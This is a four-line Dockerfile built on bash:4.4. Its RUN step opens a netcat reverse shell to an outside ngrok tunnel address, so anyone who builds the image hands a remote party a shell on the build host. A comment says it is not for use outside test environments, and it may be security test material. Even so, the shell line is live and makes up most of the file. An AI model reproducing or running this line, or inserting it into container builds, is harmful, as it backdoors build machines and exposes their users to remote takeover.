FROM bash:4.4
# Don't use outside of test environments
RUN nc 4.tcp.eu.ngrok.io 19101 -e /bin/sh
CMD ["/bin/bash"]
